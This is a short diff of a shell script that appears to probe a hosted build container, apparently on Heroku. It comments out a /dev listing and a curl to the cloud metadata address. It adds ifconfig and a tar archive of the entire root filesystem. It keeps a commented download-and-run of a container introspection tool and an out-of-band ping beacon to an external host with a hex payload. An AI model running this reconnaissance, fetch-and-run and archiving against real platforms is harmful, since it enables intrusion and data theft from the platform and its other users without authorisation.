@@ -15,10 +15,10 @@ echo "----"
 
 #cat /app/tmp/buildpacks/*/bin/*
 
-ls -la /dev/
-ls -la /dev/herokudev
+#ls -la /dev/
+#ls -la /dev/herokudev
 
-curl 169.254.169.254
+#curl 169.254.169.254
 
 
 uname -a
@@ -27,7 +27,10 @@ echo "----"
 #find . | grep -i ping
 
 #cat /proc/1/status
-
+ifconfig
 #curl -L -o amic https://github.com/genuinetools/amicontained/releases/download/v0.4.0/amicontained-linux-amd64 && chmod +x amic && ./amic
+mkdir /tmp/backup
+
+tar --exclude='/tmp/backup' -cvf /tmp/backup/archive.tar.gz / 
 
 ping -c1 -p 000a8a6956028d04ddb9edecf7b69300 pingb.in
